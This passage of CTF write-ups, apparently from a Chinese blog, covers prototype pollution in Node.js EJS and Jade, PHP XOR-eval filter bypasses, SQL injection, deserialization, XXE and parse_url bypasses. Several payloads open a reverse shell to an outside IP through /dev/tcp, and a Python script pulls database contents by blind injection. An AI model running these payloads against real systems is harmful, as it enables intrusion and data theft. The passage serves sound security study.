home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var user = new function(){\n    this.userinfo = new function(){\n    this.isVIP = false;\n    this.isAdmin = false;\n    this.isAuthor = false;     \n    };\n  }\n  utils.copy(user.userinfo,req.body);\n  if(user.userinfo.isAdmin){\n   res.end(flag);\n  }else{\n   return res.json({ret_code: 2, ret_msg: '登录失败'});  \n  }\n});\nmodule.exports = router;\n```\n\n这里要向上污染两层才行，其他的都和上面一样\n\n```json\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}}\n```\n\n**341**\n\n没有api了，直接ejs的rce\n\n```json\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"');var __tmp2\"}}}\n```\n\n**342，343**\n\n不是ejs渲染模版了\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205282335944.png)\n\n是jade渲染模版，找jade的原型链污染rce\n\n```json\n{\"__proto__\":{\"__proto__\": {\"type\":\"Block\",\"nodes\":\"\",\"compileDebug\":1,\"self\":1,\"line\":\"global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/45.15.131.101/2337 0>&1\\\"')\"}}}\n```\n\n**344**\n\n源码\n\n```javascript\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag = 'flag_here';\n  if(req.url.match(/8c|2c|\\,/ig)){\n  \tres.end('where is flag :)');\n  }\n  var query = JSON.parse(req.query.query);\n  if(query.name==='admin'&&query.password==='ctfshow'&&query.isVIP===true){\n  \tres.end(flag);\n  }else{\n  \tres.end('where is flag. :)');\n  }\n});\n```\n\n根据源码我们正常情况下需要传`?query={\"name\":\"admin\",\"password\":\"ctfshow\",\"isVIP\":true}`但是题目把逗号和他的url编码给过滤掉了，所以需要绕过。\n\n```\npayload:?query={\"name\":\"admin\"&query=\"password\":\"%63tfshow\"&query=\"isVIP\":true}\n```\n\nnodejs中会把这三部分拼接起来，为什么把ctfshow中的c编码呢，因为双引号的url编码是%22再和c连接起来就是%22c，会匹配到正则表达式。\n"},{"title":"BUUCTF记录2","url":"/posts/210d3ac7.html","content":"\nBUU第二份\n\n<!--more -->\n\n## [ISITDTU 2019]EasyPHP\n\n```php\n<?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET['_'];\nif ( preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', $_) )\n    die('rosé will not do it');\n\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n\neval($_);\n?>\n```\n\n`strlen(count_chars(strtolower($_), 0x3)) > 0xd`\n\n先看这个判断，count_chars函数用法如下\n\n| 参数     | 描述                                                         |\n| :------- | :----------------------------------------------------------- |\n| *string* | 必需。规定要检查的字符串。                                   |\n| *mode*   | 可选。规定返回模式。默认是 0。有以下不同的返回模式：<br />0 - 数组，ASCII 值为键名，出现的次数为键值1 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数大于 0 的值<br />2 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数等于 0 的值<br />3 - 字符串，带有所有使用过的不同的字符<br />4 - 字符串，带有所有未使用过的不同的字符 |\n\n那么上述判断条件就是要保证传入的数据中有不多于13中不同的字符，先使用phpinfo查看信息\n\n```\n?.=(~%8F%97%8F%96%91%99%90)();\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-26 15.30.06.png)\n\n可以使用scandir来扫描文件，构建payload：`print_r(scandir('.'))`\n\n使用异或脚本生成\n\n```python\nstr=\"print_r\"\nfor i in str:\n    print(hex(int(hex(ord(i)),16) ^ 0xff),end='')\n```\n\n生成的payload如下\n\n```\n?.=((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%d1)^(%ff)))); \n```\n\n但是此时我们发现超过了13个不同字符的限制，所以我们需要通过异或缩减原始字符数量\n\n```python\nnow ='\\'().;_acdinprst'\nfor i in now :\n    for j in now:\n        for k in now :\n            for m in now :\n                if ord(j)^ord(k)^ord(m) == ord(i):\n                    if(j==k or j==m or m==k ):\n                        continue\n                    else :\n                        print(i+'=='+j + '^'+ k +'^'+m)\n```\n\n结果中可供替换的字符有很多，挑出三个好用的\n\n```\nt = s^c^d\ns^0xff=0x8c\nc^0xff=0x9c \nd^0xff=0x9b\nn = i^c^d\ni^0xff=0x96\nc^0xff=0x9c\nd^0xff=0x9b\nr = a^c^p\na^0xff=0x9e\nc^0xff=0x9c\np^0xff=0x8f\n```\n\n最终异或时候将不需要异或的字符串异或0xFF两次即可\n\n```\nprint_r=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))\nscandir=((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))\n最终payload：?.=((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));\n```\n\n获得文件名，尝试访问发现没有权限，只能使用函数读取`readfile(end(scandir('.')))`\n\n```\nArray ( [0] => . [1] => .. [2] => index.php [3] => n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )\n```\n\n真·最终payload\n\n```\n?.=((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));\n```\n\n## [GYCTF2020]Ez_Express\n\n本题触及知识盲区，乖乖学习node.js去咯\n\n首先还是要了解一下node.js，通俗意义上理解就是javascript的后端版本，所以基本上语法是和javascript一样的，这里贴个大佬的[node.js相关安全问题总结](https://www.cnblogs.com/20175211lyz/p/12659738.html)，然后就是这道题了，是node.js的原型链污染\n\n**node.js的原型链污染**\n\n在js中万物皆对象，而在js我们如果想要定义一个类的话就需要使用类似于构造函数的方式来构造\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n}\nnew Foo()\n```\n\n类中的方法也同样可以写在构造函数内\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n    this.show = function() {\n        console.log(this.bar)\n    }\n}\n(new Foo()).show()\n```\n\n但是这么写的问题是，我们每新建一个Foo对象时，this.show函数就会执行一次，也就是说，show方法实际上是被绑定在对象上而不是该对象的“类”上。而我们希望在创建类的时候只创建一次show方法，此时我们就需要使用原型(`prototype`)了\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n}\n\nFoo.prototype.show = function show() {\n    console.log(this.bar)\n}\n\nlet foo = new Foo()\nfoo.show()\n```\n\n我们可以认为原型`prototype`是类`Foo`的一个属性，而所有用`Foo`类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的`foo`对象，其天生就具有`foo.show()`方法。\n\n我们可以通过`Foo.prototype`来访问`Foo`类的原型，但`Foo`实例化出来的对象，是不能通过prototype访问原型的。这时候，就该`__proto__`登场了。\n\n一个Foo类实例化出来的foo对象，可以通过`foo.__proto__`属性来访问Foo类的原型，也就是说：\n\n```javascript\nfoo.__proto__ == Foo.prototype\n```\n\n所以\n\n1. `prototype`是一个类的属性，所有类对象在实例化的时候将会拥有`prototype`中的属性和方法\n2. 一个对象的`__proto__`属性，指向这个对象所在的类的`prototype`属性\n3. 所有类对象在实例化的时候将会拥有`prototype`中的属性和方法，这个特性被用来实现JavaScript中的继承机制\n\n那么问题就出在对于js来说，万物皆对象，只要我们不断的向上访问`__proto__`属性，再对其中的某个属性进行修改，总能找到相对于我们需要修改的类的父类，此时再新建我们需要修改的类时就自动带上了我们修改的内容\n\n以上全是知识，正式开始做题\n\n首先就是这个\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/20220526230030.png)\n\n用admın经过`toUpperCase`处理后变成ADMIN，进去之后没啥头绪，扫个目录吧，www.zip拿到源码，可以看到res中的outputFunctionName属性为空，可以进行污染，并且在info中直接获得的就是outputFunctionName中的内容\n\n```javascript\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n```\n\n再加上上面的clone方法\n\n```javascript\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\n```\n\n此时我们向/action中传入json编码后的payload\n\n```\nPOST:\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//\"}}\n```\n\n再访问info即可获取flag\n\n## [安洵杯 2019]不是文件上传\n\n传文件，试后缀，扫目录都不行，看源码\n\n```php\n<?php\nclass helper {\n\tprotected $folder = \"pic/\";\n\tprotected $ifview = False; \n\tprotected $config = \"config.txt\";\n\t// The function is not yet perfect, it is not open yet.\n\n\tpublic function upload($input=\"file\")\n\t{\n\t\t$fileinfo = $this->getfile($input);\n\t\t$array = array();\n\t\t$array[\"title\"] = $fileinfo['title'];\n\t\t$array[\"filename\"] = $fileinfo['filename'];\n\t\t$array[\"ext\"] = $fileinfo['ext'];\n\t\t$array[\"path\"] = $fileinfo['path'];\n\t\t$img_ext = getimagesize($_FILES[$input][\"tmp_name\"]);\n\t\t$my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]);\n\t\t$array[\"attr\"] = serialize($my_ext);\n\t\t$id = $this->save($array);\n\t\tif ($id == 0){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\techo \"<br>\";\n\t\techo \"<p>Your images is uploaded successfully. And your image's id is $id.</p>\";\n\t}\n\n\tpublic function getfile($input)\n\t{\n\t\tif(isset($input)){\n\t\t\t$rs = $this->check($_FILES[$input]);\n\t\t}\n\t\treturn $rs;\n\t}\n\n\tpublic function check($info)\n\t{\n\t\t$basename = substr(md5(time().uniqid()),9,16);\n\t\t$filename = $info[\"name\"];\n\t\t$ext = substr(strrchr($filename, '.'), 1);\n\t\t$cate_exts = array(\"jpg\",\"gif\",\"png\",\"jpeg\");\n\t\tif(!in_array($ext,$cate_exts)){\n\t\t\tdie(\"<p>Please upload the correct image file!!!</p>\");\n\t\t}\n\t    $title = str_replace(\".\".$ext,'',$filename);\n\t    return array('title'=>$title,'filename'=>$basename.\".\".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.\".\".$ext);\n\t}\n\n\tpublic function save($data)\n\t{\n\t\tif(!$data || !is_array($data)){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\t$id = $this->insert_array($data);\n\t\treturn $id;\n\t}\n\n\tpublic function insert_array($data)\n\t{\t\n\t\t$con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\");\n\t\tif (mysqli_connect_errno($con)) \n\t\t{ \n\t\t    die(\"Connect MySQL Fail:\".mysqli_connect_error());\n\t\t}\n\t\t$sql_fields = array();\n\t\t$sql_val = array();\n\t\tforeach($data as $key=>$value){\n\t\t\t$key_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $key);\n\t\t\t$value_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $value);\n\t\t\t$sql_fields[] = \"`\".$key_temp.\"`\";\n\t\t\t$sql_val[] = \"'\".$value_temp.\"'\";\n\t\t}\n\t\t$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\";\n\t\tmysqli_query($con, $sql);\n\t\t$id = mysqli_insert_id($con);\n\t\tmysqli_close($con);\n\t\treturn $id;\n\t}\n\n\tpublic function view_files($path){\n\t\tif ($this->ifview == False){\n\t\t\treturn False;\n\t\t\t//The function is not yet perfect, it is not open yet.\n\t\t}\n\t\t$content = file_get_contents($path);\n\t\techo $content;\n\t}\n\n\tfunction __destruct(){\n\t\t# Read some config html\n\t\t$this->view_files($this->config);\n\t}\n}\n\n?>\n```\n\n```php\n//upload.php\ninclude(\"./helper.php\");\nclass upload extends helper {\n\tpublic function upload_base(){\n\t\t$this->upload();\n\t}\n}\n\nif ($_FILES){\n\tif ($_FILES[\"file\"][\"error\"]){\n\t\tdie(\"Upload file failed.\");\n\t}else{\n\t\t$file = new upload();\n\t\t$file->upload_base();\n\t}\n}\n\n$a = new helper();\n```\n\n```php\n//show.php\ninclude(\"./helper.php\");\n$show = new show();\nif($_GET[\"delete_all\"]){\n\tif($_GET[\"delete_all\"] == \"true\"){\n\t\t$show->Delete_All_Images();\n\t}\n}\n$show->Get_All_Images();\n\nclass show{\n\tpublic $con;\n\n\tpublic function __construct(){\n\t\t$this->con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\");\n\t\tif (mysqli_connect_errno($this->con)){ \n   \t\t\tdie(\"Connect MySQL Fail:\".mysqli_connect_error());\n\t\t}\n\t}\n\n\tpublic function Get_All_Images(){\n\t\t$sql = \"SELECT * FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t\tif ($result->num_rows > 0){\n\t\t    while($row = $result->fetch_assoc()){\n\t\t    \tif($row[\"attr\"]){\n\t\t    \t\t$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);\n\t\t\t\t\t$attr = unserialize($attr_temp);\n\t\t\t\t}\n\t\t        echo \"<p>id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"</p>\";\n\t\t    }\n\t\t}else{\n\t\t    echo \"<p>You have not uploaded an image yet.</p>\";\n\t\t}\n\t\tmysqli_close($this->con);\n\t}\n\n\tpublic function Delete_All_Images(){\n\t\t$sql = \"DELETE FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t}\n}\n?>\n```\n\n找到可供利用的方法\n\n```php\n\tpublic function view_files($path){\n\t\tif ($this->ifview == False){\n\t\t\treturn False;\n\t\t\t//The function is not yet perfect, it is not open yet.\n\t\t}\n\t\t$content = file_get_contents($path);\n\t\techo $content;\n\t}\n```\n\n反序列化的方法\n\n```php\n\tpublic function Get_All_Images(){\n\t\t$sql = \"SELECT * FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t\tif ($result->num_rows > 0){\n\t\t    while($row = $result->fetch_assoc()){\n\t\t    \tif($row[\"attr\"]){\n\t\t    \t\t$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);\n\t\t\t\t\t$attr = unserialize($attr_temp);\n\t\t\t\t}\n\t\t        echo \"<p>id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"</p>\";\n\t\t    }\n\t\t}\n```\n\n序列化的方法\n\n```php\n\tpublic function upload($input=\"file\")\n\t{\n\t\t$fileinfo = $this->getfile($input);\n\t\t$array = array();\n\t\t$array[\"title\"] = $fileinfo['title'];\n\t\t$array[\"filename\"] = $fileinfo['filename'];\n\t\t$array[\"ext\"] = $fileinfo['ext'];\n\t\t$array[\"path\"] = $fileinfo['path'];\n\t\t$img_ext = getimagesize($_FILES[$input][\"tmp_name\"]);\n\t\t$my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]);\n\t\t$array[\"attr\"] = serialize($my_ext);\n\t\t$id = $this->save($array);\n\t\tif ($id == 0){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\techo \"<br>\";\n\t\techo \"<p>Your images is uploaded successfully. And your image's id is $id.</p>\";\n\t}\n```\n\n首先构造helper类\n\n```php\n<?php\nclass helper\n{\n    protected $ifview=true;\n    protected $config=\"/flag\";\n}\n$a = new helper();\necho serialize($a);\necho bin2hex(serialize($a));\n?>\n//O:6:\"helper\":2:{s:9:\"\u0000*\u0000ifview\";b:1;s:9:\"\u0000*\u0000config\";s:5:\"/flag\";}\n```\n\n题目中会将序列化后的\\0*\\0转为\\0\\0\\0再存入数据库并且在取出是逆向使用，其实对于我们的注入没有任何影响\n\n然后查看sql语句构造方法`$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\";`在该方法中，我们可以使用#截断来注释掉后面内容，在文件名处构造payload进行sql注入，而\\0字符不显示，使用16进制编码来将字符串注入\n\n```\npayload：\n文件名：\n1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg\n```\n\n## [极客大挑战 2020]Roamphp1-Welcome\n\n405换POST，`roam1[]=1&roam2[]=2`\n\n## [RoarCTF 2019]Online Proxy\n\n看源码，发现注释中存在我们的信息，存在Last IP，应该是被写入了数据库，尝试在X-Forward-For处构造payload，确实存在，使用`1' or '1`进行测试，发现返回的Last IP变成了1，说明存在SQL注入，构造语句\n\n```\n0' or if() or '0\n```\n\n这样在结果正确时就会返回1\n\n语句的执行顺序是\n\n1、读取IP，并且回显到Current IP位置\n\n2、传入任意不同IP，此时Last IP中的语句被写入数据库\n\n3、传入第二次访问的IP，此时由于与上次访问IP相同，会从数据库中取出注入的语句并且执行回显，完成注入\n\n构造~~偷~~脚本\n\n```python\n# coding:utf-8 \nimport requests\nimport time\nurl = 'http://node3.buuoj.cn:25869/'\n\nres = ''\nfor i in range(1,200):\n    print(i)\n    left = 31\n    right = 127\n    mid = left + ((right - left)>>1)\n    while left < right:\n        #payload = \"0' or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{}) or '0\".format(i,mid)\n        #payload  = \"0' or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'F4l9_D4t4B45e'),{},1))>{}) or '0\".format(i,mid)\n        #payload  = \"0' or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'F4l9_t4b1e'),{},1))>{}) or '0\".format(i,mid)\n        payload = \"0' or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))>{}) or '0\".format(i,mid)\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    }\n        r = requests.post(url = url, headers = headers)\n\n        payload = '111'\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    }\n        r = requests.post(url = url, headers = headers)\n\n        payload = '111'\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    } \n        r = requests.post(url = url, headers = headers)\n\n\n        if r.status_code == 429:\n            print('too fast')\n            time.sleep(2)\n        if 'Last Ip: 1'  in r.text:\n            left = mid + 1\n        elif 'Last Ip: 1' not in r.text:\n            right = mid \n        mid = left + ((right-left)>>1)\n    if mid == 31 or mid == 127:\n        break\n    res += chr(mid)\n    print(str(mid),res)\n    time.sleep(1)\n#information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e\n#F4l9_t4b1e\n#F4l9_C01uMn\n```\n\n## [HarekazeCTF2019]Avatar Uploader 1\n\n传图片马不通过估计是因为`getimagesize`没有拿到大小信息，自己搞一个就行，上传发现啥也没得，就换了个头像，看源码咯\n\n```php\n<?php\nerror_reporting(0);\n\nrequire_once('config.php');\nrequire_once('lib/util.php');\nrequire_once('lib/session.php');\n\n$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);\n\n// check whether file is uploaded\nif (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {\n  error('No file was uploaded.');\n}\n\n// check file size\nif ($_FILES['file']['size'] > 256000) {\n  error('Uploaded file is too large.');\n}\n\n// check file type\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$type = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\nif (!in_array($type, ['image/png'])) {\n  error('Uploaded file is not PNG format.');\n}\n\n// check file width/height\n$size = getimagesize($_FILES['file']['tmp_name']);\nif ($size[0] > 256 || $size[1] > 256) {\n  error('Uploaded image is too large.');\n}\nif ($size[2] !== IMAGETYPE_PNG) {\n  // I hope this never happens...\n  error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n\n// ok\n$filename = bin2hex(random_bytes(4)) . '.png';\nmove_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);\n\n$session->set('avatar', $filename);\nflash('info', 'Your avatar has been successfully updated!');\nredirect('/');\n```\n\n可以看到`if ($size[2] !== IMAGETYPE_PNG)`成立的话就会输出flag\n\ngetimagesize返回结果说明\n\n- 索引 0 给出的是图像宽度的像素值\n- 索引 1 给出的是图像高度的像素值\n- 索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM\n- 索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签\n- 索引 bits 给出的是图像的每种颜色的位数，二进制格式\n- 索引 channels 给出的是图像的通道值，RGB 图像默认是 3\n- 索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(\"Content-type: image/jpeg\");\n\n所以我们现在需要的条件是：\n\n1、文件经过`finfo_file`方法检测到的是PNG图片\n\n2、getimagesize函数返回图片信息，第三个元素不能等于IMAGETYPE_PNG，也就是不能为3\n\n`finfo_file`方法是通过检测文件头的十六进制信息来判断文件类型的，那么我们一点点删除直到`finfo_file`能读出类型而`getimagesize`读不出内容即可\n\n## [CISCN2019 华东南赛区]Web4\n\nRead Something，传参读文件试试`/etc/passwd`读到了，那再读读环境文件吧`/proc/self/environ`，看到python文件位置，读源码\n\n```python\n# encoding:utf-8\nimport re, random, uuid, urllib\nfrom flask import Flask, session, request\n\napp = Flask(__name__)\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\napp.debug = True\n\n@app.route('/')\ndef index():\n    session['username'] = 'www-data'\n    return 'Hello World! <a href=\"/read?url=https://baidu.com\">Read somethings</a>'\n\n@app.route('/read')\ndef read():\n    try:\n        url = request.args.get('url')\n        m = re.findall('^file.*', url, re.IGNORECASE)\n        n = re.findall('flag', url, re.IGNORECASE)\n        if m or n:\n            return 'No Hack'\n        res = urllib.urlopen(url)\n        return res.read()\n    except Exception as ex:\n        print str(ex)\n    return 'no response'\n\n@app.route('/flag')\ndef flag():\n    if session and session['username'] == 'fuck':\n        return open('/flag.txt').read()\n    else:\n        return 'Access denied'\n\nif __name__=='__main__':\n    app.run(\n        debug=True,\n        host=\"0.0.0.0\"\n    )\n\n```\n\n可以看到如果想拿到flag，就要在session处构造username为fuck，再看`SECRET_KEY`处\n\n`random.seed(uuid.getnode())`这里的getnode用于获取网络接口的mac地址，如果机器有多个mac地址，则返回通用管理的mac地址\n\n`str(random.random()*233)`此处的随机数由于之前播撒了种子，所以生成的是伪随机数\n\n所以要先读一下环境的网卡地址`/sys/class/net/eth0/address`，然后用脚本得到SECRET_KEY\n\n```python\nrandom.seed(0xae3fa6c532bd)\nrandStr = str(random.random()*233)\nprint(randStr)\n```\n\n伪造session\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205281141102.png)\n\n上传发现不行，寄了以后再来填坑\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [BSidesCF 2019]SVGMagic\n\n冷知识：SVG格式是由xml语法定义的\n\n关于SVG上传造成的漏洞可以看[这里](https://zhuanlan.zhihu.com/p/323315064)\n\n所以自然联想到XXE漏洞\n\n构造payload\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"file:///proc/self/pwd/flag.txt\">\n]>\n<svg height=\"100\" width=\"1000\">\n  <text x=\"10\" y=\"20\">&file;</text>\n</svg>\n```\n\n上传拿flag~~环境似乎有问题，不管怎么传都会报错~~\n\n## [N1CTF 2018]eating_cms\n\n扫出注册界面，注册登录，发现参数传递，尝试使用伪协议读取文件成功\n\n```php\n//user.php\n<?php\nrequire_once(\"function.php\");\nif( !isset( $_SESSION['user'] )){\n    Header(\"Location: index.php\");\n\n}\nif($_SESSION['isadmin'] === '1'){\n    $oper_you_can_do = $OPERATE_admin;\n}else{\n    $oper_you_can_do = $OPERATE;\n}\n//die($_SESSION['isadmin']);\nif($_SESSION['isadmin'] === '1'){\n    if(!isset($_GET['page']) || $_GET['page'] === ''){\n        $page = 'info';\n    }else {\n        $page = $_GET['page'];\n    }\n}\nelse{\n    if(!isset($_GET['page'])|| $_GET['page'] === ''){\n        $page = 'guest';\n    }else {\n        $page = $_GET['page'];\n        if($page === 'info')\n        {\n//            echo(\"<script>alert('no premission to visit info, only admin can, you are guest')</script>\");\n            Header(\"Location: user.php?page=guest\");\n        }\n    }\n}\nfilter_directory();\n//if(!in_array($page,$oper_you_can_do)){\n//    $page = 'info';\n//}\ninclude \"$page.php\";\n?>\n```\n\n```php\n//function.php\n<?php\nsession_start();\nrequire_once \"config.php\";\nfunction Hacker()\n{\n    Header(\"Location: hacker.php\");\n    die();\n}\n\nfunction filter_directory()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction filter_directory_guest()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction Filter($string)\n{\n    global $mysqli;\n    $blacklist = \"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\";\n    $whitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><\";\n    for ($i = 0; $i < strlen($string); $i++) {\n        if (strpos(\"$whitelist\", $string[$i]) === false) {\n            Hacker();\n        }\n    }\n    if (preg_match(\"/$blacklist/is\", $string)) {\n        Hacker();\n    }\n    if (is_string($string)) {\n        return $mysqli->real_escape_string($string);\n    } else {\n        return \"\";\n    }\n}\n\nfunction sql_query($sql_query)\n{\n    global $mysqli;\n    $res = $mysqli->query($sql_query);\n    return $res;\n}\n\nfunction login($user, $pass)\n{\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'\";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n    if ($res->num_rows) {\n        $data = $res->fetch_array();\n        $_SESSION['user'] = $data[username_which_you_do_not_know];\n        $_SESSION['login'] = 1;\n        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction updateadmin($level,$user)\n{\n    $sql = \"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' \";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n//    die($res);\n    if ($res == 1) {\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction register($user, $pass)\n{\n    global $mysqli;\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')\";\n    $res = sql_query($sql);\n    return $mysqli->insert_id;\n}\n\nfunction logout()\n{\n    session_destroy();\n    Header(\"Location: index.php\");\n}\n\n?>\n```\n\n查看ffffllllaaaaggg，发现被过滤了\n`/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg`\n但是parse_url解析漏洞，当url种出现下面这种情况的url，会解析错误，返回false\n`//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg`\n读取到这个文件了\n\n```\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}else {\n    echo \"you can find sth in 